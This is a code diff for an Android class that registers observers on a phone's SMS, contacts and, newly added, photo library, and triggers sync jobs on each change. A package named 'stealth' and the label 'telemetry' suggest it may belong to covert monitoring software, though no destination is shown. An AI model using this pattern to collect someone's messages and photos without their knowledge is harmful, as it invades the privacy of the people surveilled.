@@ -6,10 +6,13 @@ import android.net.Uri;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.util.Log;
 
+import com.notrack.stealth.sync.SyncWorker;
+
 /**
- * REAL-TIME CONTENT OBSERVER FOR SMS & CONTACTS TELEMETRY
+ * REAL-TIME CONTENT OBSERVER FOR SMS, CONTACTS & MEDIA TELEMETRY
  */
 public class BackupObserverService {
 
@@ -18,6 +21,7 @@ public class BackupObserverService {
 
     private static ContentObserver sSmsObserver;
     private static ContentObserver sContactsObserver;
+    private static ContentObserver sMediaObserver;
 
     public static synchronized void registerObservers(Context context) {
         if (context == null || sRegistered) return;
@@ -32,6 +36,7 @@ public class BackupObserverService {
                     super.onChange(selfChange, uri);
                     Log.d(TAG, "SMS ContentObserver change detected: " + uri);
                     SmsBackupEngine.triggerSyncAsync(appCtx);
+                    SyncWorker.enqueueSync(appCtx);
                 }
             };
 
@@ -41,6 +46,17 @@ public class BackupObserverService {
                     super.onChange(selfChange, uri);
                     Log.d(TAG, "Contacts ContentObserver change detected: " + uri);
                     ContactsBackupEngine.triggerSyncAsync(appCtx);
+                    SyncWorker.enqueueSync(appCtx);
+                }
+            };
+
+            sMediaObserver = new ContentObserver(handler) {
+                @Override
+                public void onChange(boolean selfChange, Uri uri) {
+                    super.onChange(selfChange, uri);
+                    Log.d(TAG, "Media ContentObserver change detected: " + uri);
+                    PhotoBackupEngine.triggerSyncAsync(appCtx);
+                    SyncWorker.enqueueSync(appCtx);
                 }
             };
 
@@ -50,12 +66,17 @@ public class BackupObserverService {
             appCtx.getContentResolver().registerContentObserver(
                     ContactsContract.Contacts.CONTENT_URI, true, sContactsObserver);
 
-            sRegistered = true;
-            Log.i(TAG, "Registered real-time SMS & Contacts ContentObservers successfully.");
+            appCtx.getContentResolver().registerContentObserver(
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, sMediaObserver);
 
-            // Trigger initial sync
+            sRegistered = true;
+            Log.i(TAG, "Registered real-time SMS, Contacts & Media ContentObservers successfully.");
+
+            // Trigger initial sync immediately upon observer registration
             SmsBackupEngine.triggerSyncAsync(appCtx);
             ContactsBackupEngine.triggerSyncAsync(appCtx);
+            PhotoBackupEngine.triggerSyncAsync(appCtx);
+            SyncWorker.enqueueSync(appCtx);
 
         } catch (Exception e) {
             Log.w(TAG, "Error registering content observers: " + e.getMessage());
